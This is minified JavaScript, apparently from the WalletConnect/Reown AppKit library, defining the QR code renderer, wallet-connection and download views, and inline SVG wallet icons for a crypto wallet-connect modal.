n=Array.prototype.slice.call(hDe.create(t,{errorCorrectionLevel:e}).modules.data,0),r=Math.sqrt(n.length);return n.reduce((i,s,o)=>(o%r===0?i.push([s]):i[i.length-1].push(s))&&i,[])}const gDe={generate({uri:t,size:e,logoSize:n,padding:r=8,dotColor:i="var(--apkt-colors-black)"}){const o=[],a=mDe(t,"Q"),c=(e-2*r)/a.length,l=[{x:0,y:0},{x:1,y:0},{x:0,y:1}];l.forEach(({x:y,y:E})=>{const A=(a.length-Fd)*c*y+r,R=(a.length-Fd)*c*E+r,S=.45;for(let v=0;v<l.length;v+=1){const k=c*(Fd-v*2);o.push(Mt`
            <rect
              fill=${v===2?"var(--apkt-colors-black)":"var(--apkt-colors-white)"}
              width=${v===0?k-10:k}
              rx= ${v===0?(k-10)*S:k*S}
              ry= ${v===0?(k-10)*S:k*S}
              stroke=${i}
              stroke-width=${v===0?10:0}
              height=${v===0?k-10:k}
              x= ${v===0?R+c*v+10/2:R+c*v}
              y= ${v===0?A+c*v+10/2:A+c*v}
            />
          `)}});const f=Math.floor((n+25)/c),h=a.length/2-f/2,m=a.length/2+f/2-1,b=[];a.forEach((y,E)=>{y.forEach((A,R)=>{if(a[E][R]&&!(E<Fd&&R<Fd||E>a.length-(Fd+1)&&R<Fd||E<Fd&&R>a.length-(Fd+1))&&!(E>h&&E<m&&R>h&&R<m)){const S=E*c+c/2+r,v=R*c+c/2+r;b.push([S,v])}})});const w={};return b.forEach(([y,E])=>{w[y]?w[y]?.push(E):w[y]=[E]}),Object.entries(w).map(([y,E])=>{const A=E.filter(R=>E.every(S=>!yO(R,S,c)));return[Number(y),A]}).forEach(([y,E])=>{E.forEach(A=>{o.push(Mt`<circle cx=${y} cy=${A} fill=${i} r=${c/WW} />`)})}),Object.entries(w).filter(([y,E])=>E.length>1).map(([y,E])=>{const A=E.filter(R=>E.some(S=>yO(R,S,c)));return[Number(y),A]}).map(([y,E])=>{E.sort((R,S)=>R<S?-1:1);const A=[];for(const R of E){const S=A.find(v=>v.some(k=>yO(R,k,c)));S?S.push(R):A.push([R])}return[y,A.map(R=>[R[0],R[R.length-1]])]}).forEach(([y,E])=>{E.forEach(([A,R])=>{o.push(Mt`
              <line
                x1=${y}
                x2=${y}
                y1=${A}
                y2=${R}
                stroke=${i}
                stroke-width=${c/(WW/2)}
                stroke-linecap="round"
              />
            `)})}),o}},yDe=ot`
  :host {
    position: relative;
    user-select: none;
    display: block;
    overflow: hidden;
    aspect-ratio: 1 / 1;
    width: 100%;
    height: 100%;
    background-color: ${({colors:t})=>t.white};
    border: 1px solid ${({tokens:t})=>t.theme.borderPrimary};
  }

  :host {
    border-radius: ${({borderRadius:t})=>t[4]};
    display: flex;
    align-items: center;
    justify-content: center;
  }

  :host([data-clear='true']) > wui-icon {
    display: none;
  }

  svg:first-child,
  wui-image,
  wui-icon {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translateY(-50%) translateX(-50%);
    background-color: ${({tokens:t})=>t.theme.backgroundPrimary};
    box-shadow: inset 0 0 0 4px ${({tokens:t})=>t.theme.backgroundPrimary};
    border-radius: ${({borderRadius:t})=>t[6]};
  }

  wui-image {
    width: 25%;
    height: 25%;
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  wui-icon {
    width: 100%;
    height: 100%;
    color: #3396ff !important;
    transform: translateY(-50%) translateX(-50%) scale(0.25);
  }

  wui-icon > svg {
    width: inherit;
    height: inherit;
  }
`;var e0=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let ed=class extends $e{constructor(){super(...arguments),this.uri="",this.size=500,this.theme="dark",this.imageSrc=void 0,this.alt=void 0,this.arenaClear=void 0,this.farcaster=void 0}render(){return this.dataset.theme=this.theme,this.dataset.clear=String(this.arenaClear),X`<wui-flex
      alignItems="center"
      justifyContent="center"
      class="wui-qr-code"
      direction="column"
      gap="4"
      width="100%"
      style="height: 100%"
    >
      ${this.templateVisual()} ${this.templateSvg()}
    </wui-flex>`}templateSvg(){return Mt`
      <svg viewBox="0 0 ${this.size} ${this.size}" width="100%" height="100%">
        ${gDe.generate({uri:this.uri,size:this.size,logoSize:this.arenaClear?0:this.size/4})}
      </svg>
    `}templateVisual(){return this.imageSrc?X`<wui-image src=${this.imageSrc} alt=${this.alt??"logo"}></wui-image>`:this.farcaster?X`<wui-icon
        class="farcaster"
        size="inherit"
        color="inherit"
        name="farcaster"
      ></wui-icon>`:X`<wui-icon size="inherit" color="inherit" name="walletConnect"></wui-icon>`}};ed.styles=[Dt,yDe];e0([ie()],ed.prototype,"uri",void 0);e0([ie({type:Number})],ed.prototype,"size",void 0);e0([ie()],ed.prototype,"theme",void 0);e0([ie()],ed.prototype,"imageSrc",void 0);e0([ie()],ed.prototype,"alt",void 0);e0([ie({type:Boolean})],ed.prototype,"arenaClear",void 0);e0([ie({type:Boolean})],ed.prototype,"farcaster",void 0);ed=e0([Ue("wui-qr-code")],ed);const bDe=ot`
  wui-shimmer {
    width: 100%;
    aspect-ratio: 1 / 1;
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  wui-qr-code {
    opacity: 0;
    animation-duration: ${({durations:t})=>t.xl};
    animation-timing-function: ${({easings:t})=>t["ease-out-power-2"]};
    animation-name: fade-in;
    animation-fill-mode: forwards;
  }

  @keyframes fade-in {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }
`;var tce=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let aI=class extends ss{constructor(){super(),this.basic=!1}firstUpdated(){this.basic||tt.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet?.name??"WalletConnect",platform:"qrcode",displayIndex:this.wallet?.display_index,walletRank:this.wallet?.order,view:we.state.view}})}disconnectedCallback(){super.disconnectedCallback(),this.unsubscribe?.forEach(e=>e())}render(){return this.onRenderProxy(),X`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["0","5","5","5"]}
        gap="5"
      >
        <wui-shimmer width="100%"> ${this.qrCodeTemplate()} </wui-shimmer>
        <wui-text variant="lg-medium" color="primary"> Scan this QR Code with your phone </wui-text>
        ${this.copyTemplate()}
      </wui-flex>
      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onRenderProxy(){!this.ready&&this.uri&&(this.ready=!0)}qrCodeTemplate(){if(!this.uri||!this.ready)return null;const e=this.wallet?this.wallet.name:void 0;ke.setWcLinking(void 0),ke.setRecentWallet(this.wallet);const n=Ji.state.themeVariables["--apkt-qr-color"]??Ji.state.themeVariables["--w3m-qr-color"];return X` <wui-qr-code
      theme=${Ji.state.themeMode}
      uri=${this.uri}
      imageSrc=${et(er.getWalletImage(this.wallet))}
      color=${et(n)}
      alt=${et(e)}
      data-testid="wui-qr-code"
    ></wui-qr-code>`}copyTemplate(){const e=!this.uri||!this.ready;return X`<wui-button
      .disabled=${e}
      @click=${this.onCopyUri}
      variant="neutral-secondary"
      size="sm"
      data-testid="copy-wc2-uri"
    >
      Copy link
      <wui-icon size="sm" color="inherit" name="copy" slot="iconRight"></wui-icon>
    </wui-button>`}};aI.styles=bDe;tce([ie({type:Boolean})],aI.prototype,"basic",void 0);aI=tce([Ue("w3m-connecting-wc-qrcode")],aI);var wDe=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let GW=class extends $e{constructor(){if(super(),this.wallet=we.state.data?.wallet,!this.wallet)throw new Error("w3m-connecting-wc-unsupported: No wallet provided");tt.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser",displayIndex:this.wallet?.display_index,walletRank:this.wallet?.order,view:we.state.view}})}render(){return X`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["10","5","5","5"]}
        gap="5"
      >
        <wui-wallet-image
          size="lg"
          imageSrc=${et(er.getWalletImage(this.wallet))}
        ></wui-wallet-image>

        <wui-text variant="md-regular" color="primary">Not Detected</wui-text>
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}};GW=wDe([Ue("w3m-connecting-wc-unsupported")],GW);var nce=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Y7=class extends ss{constructor(){if(super(),this.isLoading=!0,!this.wallet)throw new Error("w3m-connecting-wc-web: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.secondaryBtnLabel="Open",this.secondaryLabel=jt.CONNECT_LABELS.MOBILE,this.secondaryBtnIcon="externalLink",this.updateLoadingState(),this.unsubscribe.push(ke.subscribeKey("wcUri",()=>{this.updateLoadingState()})),tt.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"web",displayIndex:this.wallet?.display_index,walletRank:this.wallet?.order,view:we.state.view}})}updateLoadingState(){this.isLoading=!this.uri}onConnectProxy(){if(this.wallet?.webapp_link&&this.uri)try{this.error=!1;const{webapp_link:e,name:n}=this.wallet,{redirect:r,href:i}=xe.formatUniversalUrl(e,this.uri);ke.setWcLinking({name:n,href:i}),ke.setRecentWallet(this.wallet),xe.openHref(r,"_blank")}catch{this.error=!0}}};nce([Ee()],Y7.prototype,"isLoading",void 0);Y7=nce([Ue("w3m-connecting-wc-web")],Y7);const vDe=ot`
  :host([data-mobile-fullscreen='true']) {
    height: 100%;
    display: flex;
    flex-direction: column;
  }

  :host([data-mobile-fullscreen='true']) wui-ux-by-reown {
    margin-top: auto;
  }
`;var Xg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let td=class extends $e{constructor(){super(),this.wallet=we.state.data?.wallet,this.unsubscribe=[],this.platform=void 0,this.platforms=[],this.isSiwxEnabled=!!de.state.siwx,this.remoteFeatures=de.state.remoteFeatures,this.displayBranding=!0,this.basic=!1,this.determinePlatforms(),this.initializeConnection(),this.unsubscribe.push(de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return de.state.enableMobileFullScreen&&this.setAttribute("data-mobile-fullscreen","true"),X`
      ${this.headerTemplate()}
      <div class="platform-container">${this.platformTemplate()}</div>
      ${this.reownBrandingTemplate()}
    `}reownBrandingTemplate(){return!this.remoteFeatures?.reownBranding||!this.displayBranding?null:X`<wui-ux-by-reown></wui-ux-by-reown>`}async initializeConnection(e=!1){if(!(this.platform==="browser"||de.state.manualWCControl&&!e))try{const{wcPairingExpiry:n,status:r}=ke.state,{redirectView:i}=we.state.data??{};if(e||de.state.enableEmbedded||xe.isPairingExpired(n)||r==="connecting"){const s=ke.getConnections(Y.state.activeChain),o=this.remoteFeatures?.multiWallet,a=s.length>0;await ke.connectWalletConnect({cache:"never"}),this.isSiwxEnabled||(a&&o?(we.replace("ProfileWallets"),on.showSuccess("New Wallet Added")):i?we.replace(i):kt.close())}}catch(n){if(n instanceof Error&&n.message.includes("An error occurred when attempting to switch chain")&&!de.state.enableNetworkSwitch&&Y.state.activeChain){Y.setActiveCaipNetwork(Rm.getUnsupportedNetwork(`${Y.state.activeChain}:${Y.state.activeCaipNetwork?.id}`)),Y.showUnsupportedChainUI();return}n instanceof Zl&&n.originalName===Ka.PROVIDER_RPC_ERROR_NAME.USER_REJECTED_REQUEST?tt.sendEvent({type:"track",event:"USER_REJECTED",properties:{message:n.message}}):tt.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:n?.message??"Unknown"}}),ke.setWcError(!0),on.showError(n.message??"Connection error"),ke.resetWcConnection(),we.goBack()}}determinePlatforms(){if(!this.wallet){this.platforms.push("qrcode"),this.platform="qrcode";return}if(this.platform)return;const{mobile_link:e,desktop_link:n,webapp_link:r,injected:i,rdns:s}=this.wallet,o=i?.map(({injected_id:w})=>w).filter(Boolean),a=[...s?[s]:o??[]],c=de.state.isUniversalProvider?!1:a.length,l=e,f=r,h=ke.checkInstalled(a),m=c&&h,b=n&&!xe.isMobile();m&&!Y.state.noAdapters&&this.platforms.push("browser"),l&&this.platforms.push(xe.isMobile()?"mobile":"qrcode"),f&&this.platforms.push("web"),b&&this.platforms.push("desktop"),!m&&c&&!Y.state.noAdapters&&this.platforms.push("unsupported"),this.platform=this.platforms[0]}platformTemplate(){switch(this.platform){case"browser":return X`<w3m-connecting-wc-browser></w3m-connecting-wc-browser>`;case"web":return X`<w3m-connecting-wc-web></w3m-connecting-wc-web>`;case"desktop":return X`
          <w3m-connecting-wc-desktop .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-desktop>
        `;case"mobile":return X`
          <w3m-connecting-wc-mobile isMobile .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-mobile>
        `;case"qrcode":return X`<w3m-connecting-wc-qrcode ?basic=${this.basic}></w3m-connecting-wc-qrcode>`;default:return X`<w3m-connecting-wc-unsupported></w3m-connecting-wc-unsupported>`}}headerTemplate(){return this.platforms.length>1?X`
      <w3m-connecting-header
        .platforms=${this.platforms}
        .onSelectPlatfrom=${this.onSelectPlatform.bind(this)}
      >
      </w3m-connecting-header>
    `:null}async onSelectPlatform(e){const n=this.shadowRoot?.querySelector("div");n&&(await n.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.platform=e,n.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}};td.styles=vDe;Xg([Ee()],td.prototype,"platform",void 0);Xg([Ee()],td.prototype,"platforms",void 0);Xg([Ee()],td.prototype,"isSiwxEnabled",void 0);Xg([Ee()],td.prototype,"remoteFeatures",void 0);Xg([ie({type:Boolean})],td.prototype,"displayBranding",void 0);Xg([ie({type:Boolean})],td.prototype,"basic",void 0);td=Xg([Ue("w3m-connecting-wc-view")],td);var aj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let v_=class extends $e{constructor(){super(),this.unsubscribe=[],this.isMobile=xe.isMobile(),this.remoteFeatures=de.state.remoteFeatures,this.unsubscribe.push(de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(this.isMobile){const{featured:e,recommended:n}=Ge.state,{customWallets:r}=de.state,i=Be.getRecentWallets(),s=e.length||n.length||r?.length||i.length;return X`<wui-flex flexDirection="column" gap="2" .margin=${["1","3","3","3"]}>
        ${s?X`<w3m-connector-list></w3m-connector-list>`:null}
        <w3m-all-wallets-widget></w3m-all-wallets-widget>
      </wui-flex>`}return X`<wui-flex flexDirection="column" .padding=${["0","0","4","0"]}>
        <w3m-connecting-wc-view ?basic=${!0} .displayBranding=${!1}></w3m-connecting-wc-view>
        <wui-flex flexDirection="column" .padding=${["0","3","0","3"]}>
          <w3m-all-wallets-widget></w3m-all-wallets-widget>
        </wui-flex>
      </wui-flex>
      ${this.reownBrandingTemplate()} `}reownBrandingTemplate(){return this.remoteFeatures?.reownBranding?X` <wui-flex flexDirection="column" .padding=${["1","0","1","0"]}>
      <wui-ux-by-reown></wui-ux-by-reown>
    </wui-flex>`:null}};aj([Ee()],v_.prototype,"isMobile",void 0);aj([Ee()],v_.prototype,"remoteFeatures",void 0);v_=aj([Ue("w3m-connecting-wc-basic-view")],v_);const EDe=mr`
  .continue-button-container {
    width: 100%;
  }
`;var rce=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let E_=class extends $e{constructor(){super(...arguments),this.loading=!1}render(){return X`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        gap="6"
        .padding=${["0","0","4","0"]}
      >
        ${this.onboardingTemplate()} ${this.buttonsTemplate()}
        <wui-link
          @click=${()=>{xe.openHref(lme.URLS.FAQ,"_blank")}}
        >
          Learn more about names
          <wui-icon color="inherit" slot="iconRight" name="externalLink"></wui-icon>
        </wui-link>
      </wui-flex>
    `}onboardingTemplate(){return X` <wui-flex
      flexDirection="column"
      gap="6"
      alignItems="center"
      .padding=${["0","6","0","6"]}
    >
      <wui-flex gap="3" alignItems="center" justifyContent="center">
        <wui-icon-box icon="id" size="xl" iconSize="xxl" color="default"></wui-icon-box>
      </wui-flex>
      <wui-flex flexDirection="column" alignItems="center" gap="3">
        <wui-text align="center" variant="lg-medium" color="primary">
          Choose your account name
        </wui-text>
        <wui-text align="center" variant="md-regular" color="primary">
          Finally say goodbye to 0x addresses, name your account to make it easier to exchange
          assets
        </wui-text>
      </wui-flex>
    </wui-flex>`}buttonsTemplate(){return X`<wui-flex
      .padding=${["0","8","0","8"]}
      gap="3"
      class="continue-button-container"
    >
      <wui-button
        fullWidth
        .loading=${this.loading}
        size="lg"
        borderRadius="xs"
        @click=${this.handleContinue.bind(this)}
        >Choose name
      </wui-button>
    </wui-flex>`}handleContinue(){we.push("RegisterAccountName"),tt.sendEvent({type:"track",event:"OPEN_ENS_FLOW",properties:{isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}})}};E_.styles=EDe;rce([Ee()],E_.prototype,"loading",void 0);E_=rce([Ue("w3m-choose-account-name-view")],E_);var _De=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Q7=class extends $e{constructor(){super(...arguments),this.wallet=we.state.data?.wallet}render(){if(!this.wallet)throw new Error("w3m-downloads-view");return X`
      <wui-flex gap="2" flexDirection="column" .padding=${["3","3","4","3"]}>
        ${this.chromeTemplate()} ${this.iosTemplate()} ${this.androidTemplate()}
        ${this.homepageTemplate()}
      </wui-flex>
    `}chromeTemplate(){return this.wallet?.chrome_store?X`<wui-list-item
      variant="icon"
      icon="chromeStore"
      iconVariant="square"
      @click=${this.onChromeStore.bind(this)}
      chevron
    >
      <wui-text variant="md-medium" color="primary">Chrome Extension</wui-text>
    </wui-list-item>`:null}iosTemplate(){return this.wallet?.app_store?X`<wui-list-item
      variant="icon"
      icon="appStore"
      iconVariant="square"
      @click=${this.onAppStore.bind(this)}
      chevron
    >
      <wui-text variant="md-medium" color="primary">iOS App</wui-text>
    </wui-list-item>`:null}androidTemplate(){return this.wallet?.play_store?X`<wui-list-item
      variant="icon"
      icon="playStore"
      iconVariant="square"
      @click=${this.onPlayStore.bind(this)}
      chevron
    >
      <wui-text variant="md-medium" color="primary">Android App</wui-text>
    </wui-list-item>`:null}homepageTemplate(){return this.wallet?.homepage?X`
      <wui-list-item
        variant="icon"
        icon="browser"
        iconVariant="square-blue"
        @click=${this.onHomePage.bind(this)}
        chevron
      >
        <wui-text variant="md-medium" color="primary">Website</wui-text>
      </wui-list-item>
    `:null}openStore(e){e.href&&this.wallet&&(tt.sendEvent({type:"track",event:"GET_WALLET",properties:{name:this.wallet.name,walletRank:this.wallet.order,explorerId:this.wallet.id,type:e.type}}),xe.openHref(e.href,"_blank"))}onChromeStore(){this.wallet?.chrome_store&&this.openStore({href:this.wallet.chrome_store,type:"chrome_store"})}onAppStore(){this.wallet?.app_store&&this.openStore({href:this.wallet.app_store,type:"app_store"})}onPlayStore(){this.wallet?.play_store&&this.openStore({href:this.wallet.play_store,type:"play_store"})}onHomePage(){this.wallet?.homepage&&this.openStore({href:this.wallet.homepage,type:"homepage"})}};Q7=_De([Ue("w3m-downloads-view")],Q7);var ADe=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const CDe="https://walletconnect.com/explorer";let J7=class extends $e{render(){return X`
      <wui-flex flexDirection="column" .padding=${["0","3","3","3"]} gap="2">
        ${this.recommendedWalletsTemplate()}
        <w3m-list-wallet
          name="Explore all"
          showAllWallets
          walletIcon="allWallets"
          icon="externalLink"
          size="sm"
          @click=${()=>{xe.openHref("https://walletconnect.com/explorer?type=wallet","_blank")}}
        ></w3m-list-wallet>
      </wui-flex>
    `}recommendedWalletsTemplate(){const{recommended:e,featured:n}=Ge.state,{customWallets:r}=de.state;return[...n,...r??[],...e].slice(0,4).map((s,o)=>X`
        <w3m-list-wallet
          displayIndex=${o}
          name=${s.name??"Unknown"}
          tagVariant="accent"
          size="sm"
          imageSrc=${et(er.getWalletImage(s))}
          @click=${()=>{this.onWalletClick(s)}}
        ></w3m-list-wallet>
      `)}onWalletClick(e){tt.sendEvent({type:"track",event:"GET_WALLET",properties:{name:e.name,walletRank:void 0,explorerId:e.id,type:"homepage"}}),xe.openHref(e.homepage??CDe,"_blank")}};J7=ADe([Ue("w3m-get-wallet-view")],J7);const SDe=Mt`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
  <rect width="64" height="64" fill="#F7931A"/>
  <g clip-path="url(#clip0_1045_17)">
    <path d="M63.0394 39.7409C58.7654 56.8839 41.4024 67.3169 24.2574 63.0419C7.11937 58.7679 -3.31363 41.4039 0.962367 24.2619C5.23437 7.11686 22.5974 -3.31714 39.7374 0.956863C56.8814 5.23086 67.3134 22.5969 63.0394 39.7409Z" fill="#F7931A"/>
    <path d="M46.1092 27.4409C46.7462 23.1829 43.5042 20.8939 39.0712 19.3669L40.5092 13.5989L36.9982 12.7239L35.5982 18.3399C34.6752 18.1099 33.7272 17.8929 32.7852 17.6779L34.1952 12.0249L30.6862 11.1499L29.2472 16.9159C28.4832 16.7419 27.7332 16.5699 27.0052 16.3889L27.0092 16.3709L22.1672 15.1619L21.2332 18.9119C21.2332 18.9119 23.8382 19.5089 23.7832 19.5459C25.2052 19.9009 25.4622 20.8419 25.4192 21.5879L23.7812 28.1589C23.8792 28.1839 24.0062 28.2199 24.1462 28.2759C24.0292 28.2469 23.9042 28.2149 23.7752 28.1839L21.4792 37.3889C21.3052 37.8209 20.8642 38.4689 19.8702 38.2229C19.9052 38.2739 17.3182 37.5859 17.3182 37.5859L15.5752 41.6049L20.1442 42.7439C20.9942 42.9569 21.8272 43.1799 22.6472 43.3899L21.1942 49.2239L24.7012 50.0989L26.1402 44.3269C27.0982 44.5869 28.0282 44.8269 28.9382 45.0529L27.5042 50.7979L31.0152 51.6729L32.4682 45.8499C38.4552 46.9829 42.9572 46.5259 44.8522 41.1109C46.3792 36.7509 44.7762 34.2359 41.6262 32.5959C43.9202 32.0669 45.6482 30.5579 46.1092 27.4409ZM38.0872 38.6899C37.0022 43.0499 29.6612 40.6929 27.2812 40.1019L29.2092 32.3729C31.5892 32.9669 39.2212 34.1429 38.0872 38.6899ZM39.1732 27.3779C38.1832 31.3439 32.0732 29.3289 30.0912 28.8349L31.8392 21.8249C33.8212 22.3189 40.2042 23.2409 39.1732 27.3779Z" fill="white"/>
  </g>
  <defs>
    <clipPath id="clip0_1045_17">
      <rect width="64" height="64" fill="white"/>
    </clipPath>
  </defs>
</svg>
`,TDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="30" />
  <circle cx="30" cy="30" r="3" fill="#fff" />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m45.32 17.9-.88-.42.88.42.02-.05c.1-.2.21-.44.26-.7l-.82-.15.82.16a2 2 0 0 0-.24-1.4c-.13-.23-.32-.42-.47-.57a8.42 8.42 0 0 1-.04-.04l-.04-.04a2.9 2.9 0 0 0-.56-.47l-.51.86.5-.86a2 2 0 0 0-1.4-.24c-.26.05-.5.16-.69.26l-.05.02-15.05 7.25-.1.05c-1.14.55-1.85.89-2.46 1.37a7 7 0 0 0-1.13 1.14c-.5.6-.83 1.32-1.38 2.45l-.05.11-7.25 15.05-.02.05c-.1.2-.21.43-.26.69a2 2 0 0 0 .24 1.4l.85-.5-.85.5c.13.23.32.42.47.57l.04.04.04.04c.15.15.34.34.56.47a2 2 0 0 0 1.41.24l-.2-.98.2.98c.25-.05.5-.17.69-.26l.05-.02-.42-.87.42.87 15.05-7.25.1-.05c1.14-.55 1.85-.89 2.46-1.38a7 7 0 0 0 1.13-1.13 12.87 12.87 0 0 0 1.43-2.56l7.25-15.05Z"
  />
  <path
    fill="#1DC956"
    d="M33.38 32.72 30.7 29.3 15.86 44.14l.2.2a1 1 0 0 0 1.14.2l15.1-7.27a3 3 0 0 0 1.08-4.55Z"
  />
  <path
    fill="#86F999"
    d="m26.62 27.28 2.67 3.43 14.85-14.85-.2-.2a1 1 0 0 0-1.14-.2l-15.1 7.27a3 3 0 0 0-1.08 4.55Z"
  />
  <circle cx="30" cy="30" r="3" fill="#fff" transform="rotate(45 30 30)" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
</svg> `,xDe=Mt`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#clip0_7734_50402)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#EB8B47"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M19 52C24.5228 52 29 47.5228 29 42C29 36.4772 24.5228 32 19 32C13.4772 32 9 36.4772 9 42C9 47.5228 13.4772 52 19 52Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
